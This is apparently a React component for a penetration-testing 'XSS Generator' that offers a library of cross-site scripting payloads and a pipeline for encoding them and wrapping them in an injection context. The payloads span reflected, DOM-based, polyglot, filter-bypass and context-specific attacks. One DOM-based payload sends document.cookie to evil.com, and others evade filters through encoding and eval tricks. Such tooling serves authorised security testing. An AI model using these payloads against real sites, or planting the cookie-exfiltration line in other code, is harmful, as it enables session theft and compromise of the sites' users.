'use client';

import * as React from 'react';
import { Button } from '@/components/ui/button';
import { Textarea } from '@/components/ui/textarea';
import { Label } from '@/components/ui/label';
import { Input } from '@/components/ui/input';
import { Checkbox } from '@/components/ui/checkbox';
import { Tabs, TabsList, TabsTrigger } from '@/components/ui/tabs';
import { Badge } from '@/components/ui/badge';
import { ScrollArea } from '@/components/ui/scroll-area';
import { Copy, Trash2, Zap } from 'lucide-react';
import type { XssPayloadCategory, XssPayload, XssEncodingType } from '../types';

// ── Constants ─────────────────────────────────────────────

const CATEGORY_LABELS: Record<XssPayloadCategory, string> = {
  reflected: 'Reflected',
  'dom-based': 'DOM-based',
  polyglot: 'Polyglot',
  'filter-bypass': 'Bypass',
  'context-specific': 'Context',
};

const ENCODING_LABELS: Record<XssEncodingType, string> = {
  url: 'URL Encode',
  'html-entity': 'HTML Entity',
  base64: 'Base64',
  'double-url': 'Double URL',
  'unicode-escape': 'Unicode Escape',
};

const ENCODING_ORDER: XssEncodingType[] = [
  'url',
  'html-entity',
  'base64',
  'double-url',
  'unicode-escape',
];

const XSS_PAYLOADS: XssPayload[] = [
  // ── Reflected ───────────────────────────────────────────
  { id: 'r1', category: 'reflected', label: 'Script alert', payload: '<script>alert(1)</script>' },
  { id: 'r2', category: 'reflected', label: 'Image onerror', payload: '<img src=x onerror=alert(1)>' },
  { id: 'r3', category: 'reflected', label: 'SVG onload', payload: '<svg onload=alert(1)>' },
  { id: 'r4', category: 'reflected', label: 'Body onload', payload: '<body onload=alert(1)>' },
  { id: 'r5', category: 'reflected', label: 'Input autofocus', payload: '<input onfocus=alert(1) autofocus>' },
  { id: 'r6', category: 'reflected', label: 'Marquee onstart', payload: '<marquee onstart=alert(1)>' },
  { id: 'r7', category: 'reflected', label: 'Details ontoggle', payload: '<details open ontoggle=alert(1)>' },
  { id: 'r8', category: 'reflected', label: 'Iframe javascript', payload: '<iframe src="javascript:alert(1)">' },
  { id: 'r9', category: 'reflected', label: 'Break out + script', payload: '"><script>alert(1)</script>' },
  { id: 'r10', category: 'reflected', label: 'JavaScript URI', payload: 'javascript:alert(1)' },

  // ── DOM-based ───────────────────────────────────────────
  { id: 'd1', category: 'dom-based', label: 'Document cookie', payload: '<img src=x onerror="document.cookie">' },
  { id: 'd2', category: 'dom-based', label: 'Eval location.hash', payload: '<script>eval(location.hash.slice(1))</script>' },
  { id: 'd3', category: 'dom-based', label: 'Document write', payload: '<script>document.write(window.name)</script>' },
  { id: 'd4', category: 'dom-based', label: 'SVG eval atob', payload: '<svg/onload=eval(atob(location.hash.slice(1)))>' },
  { id: 'd5', category: 'dom-based', label: 'Fetch exfiltration', payload: '<img src=x onerror="fetch(\'https://evil.com?c=\'+document.cookie)">' },
  { id: 'd6', category: 'dom-based', label: 'Function constructor', payload: '<script>new Function(location.hash.slice(1))()</script>' },

  // ── Polyglot ────────────────────────────────────────────
  { id: 'p1', category: 'polyglot', label: 'Multi-context polyglot', payload: 'jaVasCript:/*-/*</TiTlE/</sTYlE/</TexTarEa/</scRiPt--!>\\x3csVg/<sVg/oNloAd=alert(1)//>\\x3e' },
  { id: 'p2', category: 'polyglot', label: 'Marquee polyglot', payload: '">><marquee><img src=x onerror=confirm(1)></marquee>"</plaintext\\..."' },
  { id: 'p3', category: 'polyglot', label: 'Onclick polyglot', payload: '"onclick=alert(1)//">' },
  { id: 'p4', category: 'polyglot', label: 'JS protocol polyglot', payload: 'javascript:"/*\\"/*\'/*</script></style></textarea></noscript></noembed><script>alert(1)</script>*/' },
  { id: 'p5', category: 'polyglot', label: 'Semicolon alert', payload: '\\";alert(1);//' },
  { id: 'p6', category: 'polyglot', label: 'Comment polyglot', payload: '<script>alert(1)</script><!--' },

  // ── Filter Bypass ───────────────────────────────────────
  { id: 'f1', category: 'filter-bypass', label: 'Case variation', payload: '<ScRiPt>alert(1)</ScRiPt>' },
  { id: 'f2', category: 'filter-bypass', label: 'fromCharCode', payload: '<script>alert(String.fromCharCode(49))</script>' },
  { id: 'f3', category: 'filter-bypass', label: 'Unicode escape', payload: '<script>\\u0061lert(1)</script>' },
  { id: 'f4', category: 'filter-bypass', label: 'Null byte injection', payload: '<scr\\x00ipt>alert(1)</scr\\x00ipt>' },
  { id: 'f5', category: 'filter-bypass', label: 'Partial unicode', payload: '<script>al\\u0065rt(1)</script>' },
  { id: 'f6', category: 'filter-bypass', label: 'Base64 wrapped eval', payload: "<script>eval(atob('YWxlcnQoMSk='))</script>" },
  { id: 'f7', category: 'filter-bypass', label: 'Unicode in handler', payload: '<img src=x onerror=\\u0061lert(1)>' },
  { id: 'f8', category: 'filter-bypass', label: 'HTML entity parens', payload: '<svg/onload=alert&#40;1&#41>' },
  { id: 'f9', category: 'filter-bypass', label: 'URL encoded', payload: '%3Cscript%3Ealert(1)%3C/script%3E' },
  { id: 'f10', category: 'filter-bypass', label: 'Mixed case', payload: '<sCrIpT>alert(1)</ScRiPt>' },

  // ── Context-specific ────────────────────────────────────
  { id: 'c1', category: 'context-specific', label: 'HTML body', payload: '<script>alert(1)</script>' },
  { id: 'c2', category: 'context-specific', label: 'HTML attribute', payload: '" onmouseover="alert(1)' },
  { id: 'c3', category: 'context-specific', label: 'JS string break', payload: "';alert(1);//" },
  { id: 'c4', category: 'context-specific', label: 'URL context', payload: 'javascript:alert(1)' },
  { id: 'c5', category: 'context-specific', label: 'CSS context', payload: '</style><script>alert(1)</script>' },
  { id: 'c6', category: 'context-specific', label: 'HTML comment', payload: '--><script>alert(1)</script><!--' },
  { id: 'c7', category: 'context-specific', label: 'Template literal', payload: '${alert(1)}' },
];

// ── Encoding Functions ────────────────────────────────────

function applyUrlEncode(str: string): string {
  return encodeURIComponent(str);
}

function applyHtmlEntityEncode(str: string): string {
  return str
    .replace(/&/g, '&amp;')
    .replace(/</g, '&lt;')
    .replace(/>/g, '&gt;')
    .replace(/"/g, '&quot;')
    .replace(/'/g, '&#39;');
}

function applyBase64Encode(str: string): string {
  return btoa(unescape(encodeURIComponent(str)));
}

function applyDoubleUrlEncode(str: string): string {
  return encodeURIComponent(encodeURIComponent(str));
}

function applyUnicodeEscape(str: string): string {
  return Array.from(str)
    .map((c) => '\\u' + c.charCodeAt(0).toString(16).padStart(4, '0'))
    .join('');
}

const ENCODING_FUNCTIONS: Record<XssEncodingType, (s: string) => string> = {
  url: applyUrlEncode,
  'html-entity': applyHtmlEntityEncode,
  base64: applyBase64Encode,
  'double-url': applyDoubleUrlEncode,
  'unicode-escape': applyUnicodeEscape,
};

// ── Main Component ────────────────────────────────────────

export function XssGeneratorTool() {
  const [activeCategory, setActiveCategory] = React.useState<XssPayloadCategory>('reflected');
  const [basePayload, setBasePayload] = React.useState('');
  const [encodings, setEncodings] = React.useState<Set<XssEncodingType>>(new Set());
  const [injectionContext, setInjectionContext] = React.useState('');
  const [encodedOutput, setEncodedOutput] = React.useState('');

  const filteredPayloads = React.useMemo(
    () => XSS_PAYLOADS.filter((p) => p.category === activeCategory),
    [activeCategory],
  );

  // Toggle encoding
  const toggleEncoding = (type: XssEncodingType) => {
    setEncodings((prev) => {
      const next = new Set(prev);
      if (next.has(type)) next.delete(type);
      else next.add(type);
      return next;
    });
  };

  // Auto-encode pipeline
  React.useEffect(() => {
    if (!basePayload.trim()) {
      setEncodedOutput('');
      return;
    }

    let result = basePayload;
    for (const enc of ENCODING_ORDER) {
      if (encodings.has(enc)) {
        result = ENCODING_FUNCTIONS[enc](result);
      }
    }

    if (injectionContext.trim()) {
      result = injectionContext.replace(/PAYLOAD|§/g, result);
    }

    setEncodedOutput(result);
  }, [basePayload, encodings, injectionContext]);

  const handleSelectPayload = (payload: XssPayload) => {
    setBasePayload(payload.payload);
  };

  const handleCopy = async (text: string) => {
    if (text) await navigator.clipboard.writeText(text);
  };

  const handleClear = () => {
    setBasePayload('');
    setEncodings(new Set());
    setInjectionContext('');
    setEncodedOutput('');
  };

  return (
    <div className="flex h-full min-h-0 flex-col bg-background">
      <div className="flex h-10 shrink-0 items-center justify-between border-b bg-muted/40 px-3 gap-2">
        <div className="flex items-center gap-2">
          <Badge variant="outline" className="font-normal text-[10px] py-px h-5 gap-1">
            <Zap className="h-3 w-3 text-amber-500 fill-amber-500/20" />
            XSS Generator
          </Badge>
          <Badge variant="secondary" className="font-normal text-[10px] py-px h-5">
            {filteredPayloads.length} payloads
          </Badge>
        </div>

        <div className="flex items-center gap-1.5">
          <Button variant="outline" size="sm" onClick={() => handleCopy(encodedOutput)} disabled={!encodedOutput} className="h-7 text-xs gap-1 px-2">
            <Copy className="h-3 w-3" />
            Copy Output
          </Button>
          <Button
            variant="ghost"
            size="icon"
            onClick={handleClear}
            disabled={!basePayload && !encodedOutput}
            className="h-7 w-7 text-muted-foreground hover:text-foreground"
          >
            <Trash2 className="h-3.5 w-3.5" />
          </Button>
        </div>
      </div>

      <main className="min-h-0 flex-1 flex flex-col">
        <section className="grid h-full min-h-0 grid-cols-1 lg:grid-cols-[300px_1fr]">
          {/* Left: Payload Library */}
          <div className="flex min-h-0 flex-col border-b bg-background lg:border-b-0 lg:border-r">
            <div className="flex h-8 shrink-0 items-center justify-between border-b bg-muted/10 px-3">
              <div className="flex items-baseline gap-2">
                <span className="text-[11px] font-semibold uppercase text-muted-foreground tracking-wider">Payload Library</span>
              </div>
            </div>
            <div className="border-b px-2 py-1.5 bg-muted/5">
              <Tabs value={activeCategory} onValueChange={(v) => setActiveCategory(v as XssPayloadCategory)}>
                <TabsList className="h-7 bg-background p-0.5 border w-full grid grid-cols-5">
                  {(Object.keys(CATEGORY_LABELS) as XssPayloadCategory[]).map((cat) => (
                    <TabsTrigger key={cat} value={cat} className="h-6 text-[10px] px-1 truncate">
                      {CATEGORY_LABELS[cat]}
                    </TabsTrigger>
                  ))}
                </TabsList>
              </Tabs>
            </div>
            <ScrollArea className="min-h-0 flex-1">
              <div className="divide-y border-t-0">
                {filteredPayloads.map((p) => (
                  <button
                    key={p.id}
                    className="w-full cursor-pointer px-3 py-2 text-left transition-colors hover:bg-muted/50 block border-b last:border-b-0"
                    onClick={() => handleSelectPayload(p)}
                  >
                    <span className="block truncate font-mono text-[11px]">{p.payload}</span>
                    <span className="mt-0.5 block text-[9px] text-muted-foreground font-medium">{p.label}</span>
                  </button>
                ))}
              </div>
            </ScrollArea>
          </div>

          {/* Right: Builder + Output */}
          <div className="flex min-h-0 flex-col bg-background">
            <div className="flex h-8 shrink-0 items-center justify-between border-b bg-muted/10 px-3">
              <div className="flex items-baseline gap-2">
                <span className="text-[11px] font-semibold uppercase text-muted-foreground tracking-wider">Payload Builder</span>
                <span className="text-[10px] text-muted-foreground hidden sm:inline">Apply encoding and context</span>
              </div>
            </div>

            <ScrollArea className="min-h-0 flex-1">
              <div className="space-y-4 p-4">
                {/* Selected Payload */}
                <div className="space-y-1">
                  <Label className="text-xs font-semibold text-muted-foreground">Payload</Label>
                  <Textarea
                    className="min-h-[70px] font-mono text-xs p-2.5 bg-muted/5 focus-visible:ring-1"
                    placeholder="Select a payload from the library or type your own..."
                    value={basePayload}
                    onChange={(e) => setBasePayload(e.target.value)}
                  />
                </div>

                {/* Encoding Pipeline */}
                <div className="space-y-1">
                  <Label className="text-xs font-semibold text-muted-foreground">Encoding Pipeline</Label>
                  <div className="text-[10px] text-muted-foreground">
                    Applied in order: URL → HTML Entity → Base64 → Double URL → Unicode
                  </div>
                  <div className="flex flex-wrap gap-x-4 gap-y-2 py-1">
                    {ENCODING_ORDER.map((enc) => (
                      <label key={enc} className="flex items-center gap-1.5 cursor-pointer text-xs select-none">
                        <Checkbox
                          checked={encodings.has(enc)}
                          onCheckedChange={() => toggleEncoding(enc)}
                        />
                        <span>{ENCODING_LABELS[enc]}</span>
                      </label>
                    ))}
                  </div>
                </div>

                {/* Injection Context */}
                <div className="space-y-1">
                  <Label className="text-xs font-semibold text-muted-foreground">Injection Context (optional)</Label>
                  <div className="text-[10px] text-muted-foreground">
                    Use PAYLOAD or § as placeholder for the encoded payload.
                  </div>
                  <Input
                    className="h-8 font-mono text-xs bg-muted/5 focus-visible:ring-1"
                    placeholder='<input value="PAYLOAD">'
                    value={injectionContext}
                    onChange={(e) => setInjectionContext(e.target.value)}
                  />
                </div>

                {/* Output */}
                <div className="space-y-1">
                  <div className="flex items-center justify-between">
                    <Label className="text-xs font-semibold text-muted-foreground">Encoded Output</Label>
                    <Button
                      variant="ghost"
                      size="icon"
                      onClick={() => handleCopy(encodedOutput)}
                      disabled={!encodedOutput}
                      className="h-6 w-6 text-muted-foreground hover:text-foreground"
                    >
                      <Copy className="h-3 w-3" />
                    </Button>
                  </div>
                  <Textarea
                    className="min-h-[70px] font-mono text-xs p-2.5 bg-muted/5 focus-visible:ring-1"
                    placeholder="Encoded output will appear here..."
                    value={encodedOutput}
                    readOnly
                  />
                </div>
              </div>
            </ScrollArea>
          </div>
        </section>
      </main>
    </div>
  );
}
